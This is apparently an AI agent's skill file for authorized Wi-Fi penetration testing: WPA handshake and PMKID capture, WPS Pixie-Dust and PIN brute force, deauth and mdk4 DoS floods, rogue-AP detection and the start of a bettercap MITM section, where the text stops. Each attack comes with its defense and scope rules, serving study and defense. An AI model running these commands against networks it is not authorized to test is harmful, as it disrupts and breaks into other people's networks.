# SKILL-MASTER — Wi-Fi Operator (Authorized Testing)

> **What this is.** The single knowledge base the local AI loads to run **authorized**
> Wi-Fi security testing end-to-end: recon → get-in → capture → crack → report, every
> attack paired with its defense. Command-first. When a detail here conflicts with a
> live `--help`, the live help wins — versions drift.
>
> **The rig (assumed everywhere).**
> `macOS host (Apple Silicon, hashcat on Metal GPU)` → `UTM/QEMU` → `Kali @ 192.168.64.2`
> → `TP-Link RTL8188EUS` USB adapter (**2.4 GHz only**, enumerates `2357:010C`; generic
> RTL8188EUS id `0bda:8179`/`0bda:f179`). **Kali captures and transmits; the Mac cracks**
> (the VM has no GPU). Measured GPU anchor used for all time math: **~185 kH/s on `-m 22000`**
> (M3 Pro). You cannot out-hardware WPA on a laptop — **candidate ordering is the skill.**
>
> **The scripts this skill drives** (all paths literal, keep the space in `Ai agent`):
> | Script | Runs on | Does |
> |---|---|---|
> | `/Users/macbook/Ai agent /wifi-lab/wifi-scan.sh` | Kali | channel-locked 2.4 GHz sweep → `BSSID\|CH\|PWR\|CLIENTS\|ESSID` |
> | `/Users/macbook/Ai agent /wifi-lab/grab.sh` | Kali | locate AP channel + capture 4-way handshake (`grab.sh [BSSID] [forced-ch]`) |
> | `/Users/macbook/Ai agent /wifi-lab/crack-mac.sh` | Mac | pull capture from Kali, convert, tiered GPU crack (`crack-mac.sh [capfile] [level 1-3]`) |
> | `/Users/macbook/Ai agent /wifi-lab/fix-adapter.sh` | Kali | soft-reset a hung monitor adapter (NO driver reload) |
> | `…/command-center/kali-scripts/{recon,pmkid,deauth,wps-attack,rogue-ap-detector,spoof}.sh` | Kali | module front-ends to the same primitives |

---

## INDEX

- **§0 Operator doctrine** — the five rules that gate everything
- **§1 Decision tree** — order of operations per target (speed)
- **§2 Session preflight** — the gate: adapter, monitor, injection, scope
- **§3 Recon** — passive survey + allowlist diff
- **§4 WPA/WPA2-PSK handshake** — EAPOL 4-way capture
- **§5 PMKID** — clientless capture (first move)
- **§6 WPS** — Pixie-Dust → default/NULL PIN → online brute → PIN→PSK
- **§7 Deauth / DoS** — the forced-reauth primitive, bounded by PMF
- **§8 Evil-twin / rogue-AP** — DETECTION + concept only
- **§9 MITM** — bettercap ARP/DNS/sniff on own devices
- **§10 WPA-Enterprise / 802.1X EAP** — capture the inner credential; MSCHAPv2 crack
- **§11 WPA3-SAE** — why offline doesn't apply; transition-mode is the opening
- **§12 Cracking playbook** — tiered, with time math at 185 kH/s
- **§13 Troubleshooting quick-reference** — error → fix
- **§14 Modern CVEs** — KRACK / Dragonblood / Kr00k / FragAttacks at interview depth
- **§15 Defense master table** — attack → control → how to verify it holds
- **§16 Band/card reality** — what the RTL8188EUS can and cannot do
- **§App-WEP** — WEP cracking: fake-auth, ARP-replay, chopchop/frag, PTW, caffe-latte/hirte
- **§App-ACCESS** — prove access: wpa_supplicant/nmcli, WEP assoc, EAP connect (the OSWP deliverable)

---

## §0. OPERATOR DOCTRINE

Five rules. They override convenience, they override a tempting shortcut, they override
"it looked quiet."

1. **Authorized only.** Your own gear, a lab you own, a sanctioned CTF/competition range,
   or OSWP (PEN-210) study on networks you have **written permission** to test. Deauth,
   association, Karma, ARP/DNS spoof are **transmitted into the air or onto a shared L2
   segment** and hit every device in range — they are not scoped to one wire. Running any
   of this against networks you don't control is a crime (US CFAA, UK CMA, EU equivalents).
2. **Allowlist-gated — enforced, not intended.** Every target **BSSID/ESSID must be on the
   written allowlist** before a single frame is transmitted. Gate it at the radio with a BPF
   filter (hcxdumptool `--bpfc`) and protect your own kit with a whitelist (mdk4 `-w`,
   `arp.spoof.whitelist`). Reconcile scope during recon (§3), not after.
3. **Act first, quietest-that-works.** Prefer the lowest-noise technique that reaches the
   objective, then stop on success. Quietness ladder:
   `WPS Pixie (offline) > PMKID (clientless) > targeted single-client deauth > broadcast deauth`.
   Broadcast deauth and floods trip WIDS in seconds — authorized noise only. Use the lowest
   TX power that reaches the target and the shortest run window.
4. **Pair every attack with its defense.** The hardening is the deliverable, not the trophy.
   A finding with no paired control is half a finding. §15 is the closing table; each attack
   section carries its own "Defense" block.
5. **Evil-twin & credential-phishing = DETECTION + CONCEPT only.** This toolkit never builds
   a captive portal, a `--hostile-portal` harvester, a rogue-RADIUS credential sink, or a
   keystroke injector. The mechanics appear so the **detector** knows the signatures and so
   you can pass OSWP theory. A live twin, if an authorized red-team ever needs one, is a
   separate, scoped, signed-off activity.

**Reporting doctrine.** Document **at the moment of success** (screenshot the instant a key
pops — never "at the end"). Keep a `results.md` per target: BSSID, channel, cipher, attack,
status, key, **time-to-crack** (quantifies real risk), and the paired remediation. A failed
attempt is a finding ("not recoverable by wordlist" is a positive result). State coverage gaps
explicitly: **RTL8188EUS = 2.4 GHz only; 5/6 GHz not assessed.** Redact recovered secrets;
store raw capture material encrypted; delete OSINT/PII with the engagement.

---

## §1. DECISION TREE — ORDER OF OPERATIONS

Read the beacon; it advertises the target's weaknesses (WPS bit, cipher, PMKID support,
client count, PMF). Spend transmit budget on the **cheapest attack that works for that target.**

```
RECON + AUTHORIZE (§2–§3): one airodump sweep -> table of cipher, WPS, clients, signal, PMF.
                            Confirm each target is on the allowlist. Note band (2.4 only here).

Per target, read ENC/AUTH, then:

 ENC = WEP ───────────────► instant & deterministic (IV volume, not guessing). Do it NOW. (§App-WEP)
 WPS set & Lck=No (wash) ─► §6  PIXIE-DUST first (offline, seconds, no lockout)
                               └ then default/derived PIN (1 try) -> NULL PIN -> online brute (park it)
 WPA/WPA2-PSK ────────────► §5  PMKID (clientless, quietest) ─ no PMKID ─► §4 handshake (deauth a client)
                               └ convert -> §12 crack on the Mac GPU
 AUTH = MGT (802.1X/EAP) ─► §10 DETECT method + concept; the deliverable is the cert-validation defense
 AUTH = SAE (WPA3) ───────► §11 no offline PSK path. Transition mode? attack the WPA2 side. Else low-EV, move on.
```

**Canonical "get in" order (fastest → slowest):**
`WPS Pixie-Dust (sec) > PMKID clientless (sec–min) > WPA handshake, deauth a client (min) > online WPS PIN (hours, noisy, lockout)`.

**Mid-competition clock discipline** — you are graded on method, speed, proof:

| Phase | Budget | Goal |
|---|---|---|
| Recon (all targets) | first 15–20 min | one sweep → table: cipher, WPS, clients, signal |
| Per-target triage | 2–3 min each | pick the attack from the tree — **don't start cracking yet** |
| Quick wins first | front-load | WEP, WPS-Pixie, PMKID-on-weak-PSK — anything finishing in minutes |
| Slow cracks | background | long dict/mask on the GPU **while you work the next target** |
| Documentation | rolling | screenshot the moment the key pops |

Breadth before depth (two fully-documented beats three half-done). One `tmux` pane per
target; GPU cracking in parallel with enumeration. Expected-value-per-minute, always — don't
rabbit-hole. `tmux new -s wifi` → pane1 recon, pane2 capture, pane3 hashcat, pane4 notes.

---

## §2. SESSION PREFLIGHT — THE GATE

Three independent things must all be true before anything downstream works; **monitor +
injection is a DRIVER property, not a tool property.** Something is always fighting you for
the radio (`airmon-ng check kill` is the first command of every session). And the WPA hash
format is **`-m 22000`** now — `-m 2500`/`.hccapx` is dead.

```bash
# --- ON KALI ---
# 0. Identify the hardware FIRST (every time)
lsusb                                   # expect 2357:010c (this TP-Link) or 0bda:8179 (generic RTL8188EUS)
iw list | sed -n '/Supported interface modes/,/Supported commands/p'   # must show: * monitor
iw dev                                  # the netdev the driver created (wlan0 / wlan1 — READ it, don't assume)

# 1. Kill daemons that grab the radio
sudo airmon-ng check kill               # NetworkManager + wpa_supplicant + dhclient — THE #1 beginner failure if skipped
sudo rfkill unblock all

# 2. Monitor mode — raw iw method (cleanest on Realtek; this is what wifi-scan.sh/grab.sh use)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel 6         # monitor does NOT auto-hop; pin the target channel
sudo iw dev wlan0 set power_save off    # power-save silently drops captured frames
iw dev wlan0 info                       # confirm: type monitor

# 3. PROVE INJECTION — the gate. Run this NOW, not after an hour of "why did the deauth do nothing".
sudo aireplay-ng -9 wlan0               # "Injection is working!" + 30/30:100%  (== --test)
sudo iw reg set US ; iw reg get         # legal channels + TX power
```

> **Interface discipline — do not mix:** airodump/aireplay/wifite/besside use a **monitor**
> iface. **hcxdumptool and bettercap drive the RAW physical iface themselves** — do NOT
> `airmon-ng`/`iw set monitor`/`macchanger` first for them, and never point them at a virtual/mon
> iface: `sudo systemctl stop NetworkManager wpa_supplicant`.

**RTL8188EUS driver note.** Prefer the out-of-tree `aircrack-ng/rtl8188eus` (or `morrownr/8188eu`)
**DKMS** build; the in-kernel `r8188eu`/`rtl8xxxu` is hit-or-miss (sniffs but often won't inject
→ "beacons but never a PMKID"). Blacklist the in-kernel modules or the wrong one grabs the device
at boot. **Monitor mode dies silently after a kernel/driver update** — re-run step 3 at the start
of every session; a "clean" survey on a dead monitor iface is a false negative. If the adapter
hangs, soft-reset without a driver reload (a reload drops USB passthrough):

```bash
ssh kali@192.168.64.2 'sudo bash /home/kali/fix-adapter.sh'     # down -> monitor -> up, keeps passthrough
# if wlan0 is GONE from the VM, re-attach from the MAC:
utmctl usb disconnect 2357:010C; sleep 3; utmctl usb connect Kali 2357:010C
```

**VM/USB passthrough gatekeeper (macOS → UTM/QEMU):** backend must be **QEMU (not Apple
Virtualization)**; macOS *Privacy & Security ▸ Accessories ▸ Allow when unlocked*; **USB 2.0
(EHCI)** controller, **no hubs, same port**; attach the device **after** the guest boots; bind
by VID:PID (`utmctl usb connect Kali 2357:010C`) so it survives re-enumeration; `caffeinate`
the Mac mid-capture; disable USB autosuspend via udev. Use NVMe/VirtIO-cached disk and shut
down gracefully (ARM64 QEMU has had disk-corruption bugs).

---

## §3. RECON — SURVEY + SCOPE

**When:** always first, zero- or low-transmit. **Goal:** a table you triage from, and a hard
allowlist gate before any transmit.

```bash
# --- Fast path: the scan script (Kali) — channel-locked sweep, reliable on the flaky rtl8xxxu ---
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/wifi-scan.sh"'
#   -> one line per AP:  BSSID|CH|PWR|CLIENTS|ESSID  (sorted most-clients, then strongest)
#   listens only; attacks nothing. The allowlist gate is enforced before capture, not here.

# --- Manual survey (write to disk for parsing) ---
sudo airodump-ng --band bg wlan0                                        # full 2.4 GHz sweep
sudo airodump-ng --band bg -w recon --output-format pcap,csv,netxml wlan0
sudo airodump-ng -c 1,6,11 wlan0                                        # dwell on the real 2.4 GHz channels

# Decode the RSN IE precisely — the AKM suite selector tells the truth about WPA2 vs WPA3 vs transition:
sudo iw dev wlan0 scan | awk '/SSID:/{s=$2} /Authentication suites:/{print s": "$0}'
#   PSK = 00-0F-AC:2 (WPA2) · SAE = :8 (WPA3) · FT/SAE = :9 · SAE-EXT-KEY = :24 (H2E)
#   Capabilities: MFPR = PMF required (real WPA3) · MFPC = PMF capable/optional (the soft spot)
```

Read from airodump: **CH** (lock to it), **ENC/CIPHER/AUTH** (WPA2/WPA3, CCMP/TKIP, **PSK** vs
**MGT**=Enterprise vs **SAE**=WPA3), **MFP/RSN** (PMF?), **PWR** (closer to 0 = cleaner capture),
and whether the AP has **associated clients** (needed for a deauth handshake).

**Scope reconciliation — the step amateurs skip (allowlist gate belongs HERE):**

```bash
awk -F, 'NR>1 && $1 ~ /:/ {print $1, $14}' recon-01.csv | sort -u > seen.txt
grep -iF -f allowlist.txt seen.txt > in-scope.txt      # everything you transmit at must be in here
```

**Gotchas:** monitor not auto-hopping (pin `-c`); 5/6 GHz targets invisible forever on this card;
hidden SSID shows blank ESSID — the PMK binds to the exact SSID string, so a hidden/renamed/
trailing-space SSID breaks cracking later. **Defense:** reduce TX power / shape coverage; segment
IoT + guests onto their own SSID/VLAN; a current allowlist is also your WIDS baseline (§8, §15).

---

## §4. WPA/WPA2-PSK — EAPOL 4-WAY HANDSHAKE

**When:** WPA/WPA2-PSK and PMKID (§5) came up empty, **and a client is associated** (deauth has
nothing to force on a clientless AP → go PMKID). Four frames prove both sides know the PMK
without sending it; you only need the right message pair + ESSID.

| Msg | Dir | Carries | Value |
|-----|-----|---------|-------|
| M1 | AP→STA | ANonce (+ maybe PMKID) | PMKID = clientless win (§5) |
| M2 | STA→AP | SNonce + MIC | crackable with M1 |
| M3 | AP→STA | GTK + MIC | **M2+M3 = "authorized" pair — strongest** |
| M4 | STA→AP | MIC (ack) | M1+M4 weakest (fails if nonce zeroed) |

```bash
# --- Fast path: grab.sh (Kali) — locate channel, capture, minimal deauth, verify, report ---
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/grab.sh" AA:BB:CC:DD:EE:FF'
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/grab.sh" AA:BB:CC:DD:EE:FF 6'   # force ch 6, skip flaky scan
#   -> RESULT=HANDSHAKE_CAPTURED file=/tmp/cap-01.cap   | or NO_HANDSHAKE clients_seen=[...]

# --- Manual (understand this before trusting the script) ---
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0    # LOCK channel+BSSID; NO --ivs (strips frames)
#   top-right shows "WPA handshake: <bssid>" the instant a full handshake is seen
# second terminal — ONLY if a client is associated. Targeted -c beats broadcast; 3 bursts is plenty:
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0
#   -0 N = bursts (0=continuous). -c = ONE specific client. Over-deauth PREVENTS the 4-way completing.
```

**Verify a VALID handshake before you leave** (re-capture is expensive):

```bash
aircrack-ng capture-01.cap                        # "(1 handshake)" per ESSID
tshark -r capture-01.cap -Y "eapol"               # want a clean M-pair (M1+M2 or, best, M2+M3)
cowpatty -r capture-01.cap -c                      # independent 4-way integrity cross-check
```

**Gotchas (each a silent failure):** forgot `-c` lock → hopping → #1 "why no handshake?";
over-deauthing starves the exchange — small burst, wait, repeat sparingly; **never `--ivs`**;
`(not associated)` clients can't be deauthed off that AP; **PMF/802.11w → forged deauth
rejected by design** (record "mitigated by 802.11w", pivot to PMKID); no client at all → PMKID,
or return at a busier time (clients associate on arrival / after outages). A "valid handshake"
that won't crack = mismatched replay counters / zeroed nonces (M1+M4) / junk EAPOL → prefer
M2+M3, capture several. **Capture cleanly** — hcx does no nonce-error correction, so packet loss
yields a wrong PTK and the correct password *never* matches.

**Defense:** a **≥20-char random / 6-word diceware PSK** makes the captured hash computationally
useless (capture succeeds, crack never finishes) — this single control dominates. Add **802.11w
(PMF required)** to blunt deauth; move to **WPA3-SAE** (not offline-crackable); never reuse a PSK
across SSIDs (consider per-device/iPSK); rotate the PSK after any suspected capture or
contractor/guest access.

---

## §5. PMKID — CLIENTLESS CAPTURE (FIRST MOVE)

**When:** first, on any WPA/WPA2-PSK target — it's the quietest capture (one frame from the AP,
no client, ideally no deauth). Many APs put `PMKID = HMAC-SHA1-128(PMK, "PMK Name"|AP_MAC|STA_MAC)`
in M1 of the RSN IE when roaming / PMK-caching is on (atom/Steube, Aug 2018). **Fails** on
WPA3-SAE, many PMF-required deployments, WPA-Enterprise, and APs with roaming off — then fall
back to §4.

> **Version caution:** hcxdumptool CLI changed significantly at **6.3.0** (again toward 7.x).
> Old flags renamed/removed (`--enable_status`→`--rds`, `--filterlist_ap` gone,
> `--disable_client_attacks`→`--attemptclientmax`). **Always run `hcxdumptool -h` on your build.**
> Wants kernel ≥ 5.15, an in-tree driver (the out-of-tree 8188eus may warn — if PMKID capture is
> flaky in the VM, prefer the airodump+deauth path §4, which is more forgiving; the convert+crack
> half works regardless). hcxdumptool owns the **raw** iface — don't airmon/macchanger first.

```bash
# --- Fast path: the module front-end (Kali) ---
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/command-center/kali-scripts/pmkid.sh" AA:BB:CC:DD:EE:FF'

# --- Manual: hcxdumptool -> hcxpcapngtool ---
sudo systemctl stop NetworkManager wpa_supplicant
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 -F
#   --rds=1 live sorted display (watch PMKID/EAPOL land)   -F all frequencies   -c 6 instead = lock one channel (quieter)
#   Ctrl-C the moment an allowlisted BSSID reports a PMKID. ONE PMKID per AP is all you need.

# MANDATORY scoping when you don't fully control the RF env — this IS the allowlist at the radio:
sudo hcxdumptool -i wlan0 --bpfc="wlan addr3 AA:BB:CC:DD:EE:FF" -w dump.pcapng
# quiet it further by disabling the 6.3 default attacks as authorization requires:
#   --associationmax=0  (no PMKID request)   --disable_disassociation   --m2max=0
```

**Convert (PMKID and EAPOL both land in one `.hc22000`; hashcat reuses the PBKDF2 across both):**

```bash
hcxpcapngtool -o hash.hc22000 dump.pcapng
hcxpcapngtool -o hash.hc22000 -E essidlist -I idlist -U userlist dump.pcapng   # also harvest wordlist material
# read the printed summary: PMKID count 0 = AP gave none (PMF/roaming off) -> fall back to §4
# instant wins straight from the capture (default keys the AP leaked):
hcxpsktool -i hash.hc22000 | sort -u > candidates.txt
```

The `.hc22000` line encodes validity: `WPA*01*…` = PMKID, `WPA*02*…` = EAPOL. Message-pair
bitmask: `000`=M1+M2, `001`=M1+M4 (only if nonce not zeroed), `010`=**M2+M3 authorized/strongest**;
bit 7 = replay counter unchecked → needs nonce-error-correction. Filter to scope at the hash
layer too (**note: `hcxhashtool` uses `--mac-ap`, not `--bssid`**):

```bash
hcxhashtool -i hash.hc22000 --mac-ap=AABBCCDDEEFF -o target.hc22000
hcxhashtool -i hash.hc22000 --authorized -o authorized.hc22000     # keep only M2+M3
```

**Gotchas:** never `wpaclean` / never merge pcapng before converting (destroys nonce/replay
metadata — gzip is fine; reduce a huge dump with tshark, not wpaclean); never run hcxdumptool on
a virtual/mon iface or alongside aircrack/reaver (Wireshark read-along is fine); `.hccapx` can't
convert to 22000 — re-capture; version-mismatched hcx tools silently corrupt — pin hcxdumptool and
hcxpcapngtool to the same version. **Defense:** as §4 (strong PSK dominates; PMKID is just one
unauthenticated frame). Additionally **disable PMK caching / 802.11r roaming** where not needed
(MikroTik "Disable PMKID", controller OKC toggles); verify with `hcxdumptool` against your own AP
yielding no PMKID.

---

## §6. WPS — PIXIE-DUST → DEFAULT/NULL PIN → ONLINE BRUTE → PIN→PSK

**When:** `wash` shows WPS set and (ideally) `Lck=No`. WPS lets a client join with an **8-digit
PIN** instead of the passphrase; **recovering the PIN yields the WPA-PSK = full access**, bypassing
passphrase strength entirely. Three independent flaws: split-half+checksum (10⁸→~11,000 online
tries), **Pixie-Dust offline recovery** (weak/zero PRNG nonces → PIN brute-forced from one M1–M3,
no lockout), and **default/derived PINs** (vendor derives factory PIN from BSSID). Still live in
2025 (NetRise: 20/24 current devices Pixie-vulnerable) — **measure, don't assume.**

**Decision order (fastest → slowest):**
```
1. wash          -> WPS APs; note WPS ver, Lck, vendor/chipset, dBm
2. Pixie-Dust -K -> seconds IF weak-nonce chipset; OFFLINE, no lockout   *** try first ***
3. default/derived PIN -> compute from BSSID, 1 try
4. known-PIN list / NULL PIN (-p '')
5. online PIN brute -> ~11k keyspace; HOURS; triggers lockout -> tune timing, park it
6. not WPS-vulnerable -> pivot to PMKID/handshake (§5/§4)
```

```bash
# --- Fast path: module front-end (Kali) ---
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/command-center/kali-scripts/wps-attack.sh" AA:BB:CC:DD:EE:FF 6'

# --- Recon (passive): fingerprint before you transmit ---
sudo wash -i wlan0                    # columns: BSSID|Ch|dBm|WPSver|Lck|Vendor|ESSID ; aim >= -70 dBm
sudo wash -i wlan0 -c 6               # lock one channel (fewer missed packets)

# --- Pixie-Dust FIRST (offline, no lockout). reaver captures M1-M3 and auto-calls pixiewps ---
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -N -vv
#   -K 1 (==-Z) Pixie   -c lock channel (implies -f)   -N no NACKs (cleaner)   -L ignore 'locked'   -vv live exchange
sudo bully  wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3        # alternate EAP state machine (try when reaver stalls)

# Standalone pixiewps (force a mode / Realtek time window / re-run without touching the air):
pixiewps --pke <PKE> --pkr <PKR> --e-hash1 <E1> --e-hash2 <E2> --authkey <AK> --e-nonce <EN>
pixiewps --pke <..> --pkr <..> --e-nonce <..> --r-nonce <..> --e-bssid AA:BB:CC:DD:EE:FF \
         --mode 3 --start 01/2019 --end 01/2026 -j 0        # Realtek (mode 3) time-seeded PRNG window

# --- Default/derived & NULL PIN (single-shot) ---
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -p 12345670 -vv     # specific derived/known PIN
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -f -N -g 1 -vv -p ''  # NULL PIN (bully does NOT support it)

# --- Online PIN brute (slow fallback; tuned to dodge lockout; resumes from /etc/reaver/<BSSID>.wpc) ---
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -vv -N -L -d 15 -r 3:60 -T 2 -x 60   # OMIT -S on Realtek/Pixie

# --- PIN -> PSK (Pixie gave the PIN but not the PSK? replay the known PIN to dump the passphrase) ---
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -p 04847533 -vv     # prints [+] WPA PSK: '...'

# --- wifite runs the whole order across many APs ---
sudo wifite -i wlan0 --wps --pixie --kill
```

**Chipset ⇄ `--mode` (pixiewps auto-selects; knowing it predicts an instant win):** mode **1**
Ralink/MediaTek/Celeno (`E-S1=E-S2=0`, instant) · mode **2** Broadcom eCos (weak PRNG) · mode **3**
Realtek (time-seeded PRNG — needs a date window, **never use `-S`**) · Atheros/Qualcomm generally
**not** Pixie-vulnerable (proper RNG — don't burn time).

**Gotchas:** Pixie prints PIN but no PSK = expected (two phases) → re-run `reaver -p <pin>`;
**Realtek + `-S` (small-DH) = broken Pixie** (never combine); stale capture / wrong clock / wrong
`--start/--end` → no crack even on a vulnerable AP (capture fresh, `-f` last resort); **WPS LOCKED
stops online brute only, not Pixie** (try once, `-L`, don't hammer); dirty capture (weak signal,
hop) = garbage M1–M3 → lock `-c`, get closer, `-vv` to confirm `E-Hash1/E-Hash2/AuthKey` populated
before blaming the chipset; RTL8188EUS injection flakiness → "Failed to associate" loops (fix the
driver §2 first); a UI "disable" may hide WPS while firmware keeps answering.

**Defense:** **disable WPS entirely in firmware** (not the LED/button) — the only complete fix.
**Verify it took:** re-scan your own AP — `wash` must show the BSSID **absent**. Patch firmware
for proper nonce randomization (only real Pixie fix) → no patch → OpenWrt or retire. **Lockout/
rate-limiting is NOT a Pixie defense** (offline/one-exchange; a correct default PIN is one try).

---

## §7. DEAUTH / DoS — THE FORCED-REAUTH PRIMITIVE

**When:** to force a client to redo the 4-way handshake for §4 capture, or as a standalone DoS
test. On WPA2-Personal **without 802.11w**, management frames (deauth/disassoc/auth/beacon/probe)
are unauthenticated — any radio in range can forge them. **PMF is the hard bound on this entire
technique** — read the AP's RSN `MFP` before keying up.

```bash
# --- Fast path: module front-end (Kali) ---
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/command-center/kali-scripts/deauth.sh" AA:BB:CC:DD:EE:FF 6 11:22:33:44:55:66'

# --- Targeted deauth (preferred): kick ONE client. -0 N = bursts; 0 = continuous ---
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0   # SHORT burst for handshake capture
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0                        # BROADCAST (many clients ignore it; loud)

# --- mdk4: wider DoS surface. ALWAYS -w whitelist.txt in shared air to protect your own kit ---
sudo mdk4 wlan0 d -B AA:BB:CC:DD:EE:FF -E "TargetSSID" -s 200 -w whitelist.txt   # throttled deauth
sudo mdk4 wlan0 a -a AA:BB:CC:DD:EE:FF -m                                        # Auth DoS (fake clients)
sudo mdk4 wlan0 e -t AA:BB:CC:DD:EE:FF                                           # EAPOL logoff (kick 802.1X)
```

**Mechanics:** a directed (`-c`) deauth sends **128 frames per count** (64 each direction), so
`-0 1 -c` is 128 frames. The `[61|63 ACKs]` column = ACKs heard from (client|AP); **ACK≈0 means
you failed** (too far / wrong channel), not that the target is immune. Reason code (`-Z`) is
cosmetic for the DoS. **Targeted beats broadcast** (modern clients ignore broadcast deauth). **For
a handshake, less is more** — `-0 3`, stop on the banner; continuous flooding can *prevent* the
4-way. No client associated → skip deauth, go clientless PMKID (§5).

**PMF / 802.11w bound:** WPA3-SAE → PMF mandatory → classic deauth does not disconnect (expect
ACK=0). WPA2 PMF-required → same. **WPA2 PMF-optional / WPA3-transition → the weak spot** (WPA2-era
clients still accept unprotected deauth even on a "WPA3" SSID — most "WPA3" deployments are
attackable here). Unaffected by PMF: auth flood (`mdk4 a`), beacon flood (`mdk4 b`), RF jamming.
**Lab takeaway:** PMF required → record "deauth mitigated by 802.11w", pivot to PMKID.

**Defense:** **enable 802.11w/PMF required** (#1 control); move to **WPA3-SAE** (avoid long-lived
transition mode); **WIDS** on mgmt-frame anomalies (a deauth flood often *precedes* an evil-twin —
correlate). Ineffective, record as such: MAC filtering (spoofable), SSID hiding (`mdk4 p`
decloaks), VPN (L3, does nothing against L2 deauth). Detect cheaply:

```bash
sudo tshark -i wlan0 -Y "wlan.fc.type_subtype==0x0c || wlan.fc.type_subtype==0x0a" \
     -T fields -e wlan.sa -e wlan.da -e wlan.fixed.reason_code     # burst of subtype-12 = classic deauth
```

---

## §8. EVIL-TWIN / ROGUE-AP — DETECTION + CONCEPT ONLY

**When:** blue-team / posture work. **This section builds no rogue AP, portal, or harvester** (§0
rule 5). The mechanics are here so the detector knows the signatures and you can pass OSWP theory.

**Concepts (to recognize the signatures).** *Evil twin* = rogue AP copying a real **ESSID** (often
BSSID, channel, security); clients won't roam to a weaker copy, so the attacker floods **deauth**
(§7) to peel them off. ESSID+BSSID match is **not** proof of legitimacy — a competent attacker
clones the BSSID; the durable discriminators are **physical-layer** (signal strength, beacon
timing, BSS timestamp sequence). *Karma (2004)* answers directed probes "yes" to any name
(open nets only). *MANA (2014)* rebuilds each device's **PNL** from directed probes and answers a
broadcast probe with every network in it — **one BSSID advertising many ESSIDs is the #1 detection
signal**. *Known-beacon* beacons a wordlist of common SSIDs. *Enterprise twin* (concept + defense
only): if the supplicant doesn't validate the RADIUS server cert, it leaks MSCHAPv2 / cleartext to
a fake RADIUS — **defeated entirely by client-side server-cert validation** (§10).

**Detection decision order:** (1) **baseline first** — allowlist of `ESSID→{BSSID,channel,
enc/cipher,PMF}` for every AP you own; (2) passive survey, flag your ESSID from an unknown BSSID,
or a known BSSID on a new channel / weaker crypto; (3) signal/TX anomaly (two tracks for one
BSSID = two transmitters); (4) deauth-storm watch; (5) Karma/MANA tell (one BSSID, many ESSIDs);
(6) promote to standing WIDS; (7) harden so the attack fails even if present.

```bash
# --- Fast path: module front-end (Kali) ---
ssh kali@192.168.64.2 'sudo bash "/Users/macbook/Ai agent /wifi-lab/command-center/kali-scripts/rogue-ap-detector.sh" YourCorpSSID'

# --- Evil-twin diff: your ESSID from a BSSID NOT on the allowlist ---
sudo airodump-ng --band abg -w survey --output-format csv,pcap --write-interval 1 wlan0
awk -F',' 'NR>1 && $14 ~ /YourCorpSSID/ {gsub(/ /,"",$1); print $1}' survey-01.csv \
  | sort -u | comm -23 - <(sort -u allowlist.txt)        # anything printed = candidate evil twin

# --- Deauth storm + Karma/MANA tell ---
sudo tshark -i wlan0 -q -z io,stat,10,'COUNT(frame)wlan.fc.type_subtype==0x0c'       # >~20 broadcast deauth/60s = storm
sudo tshark -i wlan0 -Y 'wlan.fc.type_subtype==0x05' -T fields -e wlan.sa -e wlan.ssid | sort | uniq -c | sort -rn
#   one SA (BSSID) paired with MANY SSIDs in probe responses == Karma/MANA

# --- Standing WIDS ---
sudo kismet -c wlan0        # kismet_site.conf: apspoof=Corp1:ssid="YourCorpSSID",validmacs="..."; packets_dedup_size=0
```

**Config-drift → Kismet alert:** your ESSID + unknown BSSID → `APSPOOF`; known BSSID + new channel
→ `CHANCHANGE`/`DOT11CSASPOOF`; ESSID now open/weaker → `CRYPTODROP`/`ADVCRYPTCHANGE`; beacon rate
changed → `BEACONRATE`; BSS timestamp out of sequence → `BSSTIMESTAMP`; probe-resp channel ≠ beacon
→ `PROBECHAN`; Karma OUI → `KARMAOUI`; client without PMF on MFP-capable net → `NOCLIENTMFP` (your
hardening gap). A non-beaconing Karma AP won't show in a normal scan — you need the IDS view.
**nzyme** adds air-vs-wire correlation, RF fingerprinting, impossible-location, attack-platform
recognition (Pineapple/Pwnagotchi/Marauder/Flipper). Lock each sensor to a channel (hopping misses
fast floods); RSSI is noisy — use it to flag, not convict.

**Defense:** **802.11w/PMF required** (kills the deauth herding step); **WPA3-SAE + Transition
Disable** (closes the downgrade the twin relies on); **enterprise: enforce RADIUS server-cert
validation on every supplicant, prefer EAP-TLS**, pushed by MDM/GPO; **client hygiene vs Karma/
MANA**: off auto-join for open nets, prune the PNL, avoid hidden SSIDs (MAC randomization does
**not** help — the PNL still leaks); operationally: current allowlist, stationary WIDS, alert on
deauth storms + APSPOOF, physically locate confirmed rogues. Public Wi-Fi has no WIDS → a twin
there is a **client-side** problem (HTTPS, VPN, cert checks, auto-join off).

---

## §9. MITM — bettercap (OWN DEVICES, AFTER ACCESS)

**When:** you are associated to the lab LAN (managed mode — **monitor mode NOT needed**) and want
to demonstrate on-path interception against **your own** devices. ARP has no authentication; an
unsolicited ARP reply poisons caches so your box sits on-path.

```bash
sudo bettercap -iface wlan0                      # interactive, bound to the test-LAN iface
# in-session:
net.probe on            # ACTIVE discovery, wait ~5-10s
net.show                # IP / MAC / vendor; find gateway + victim
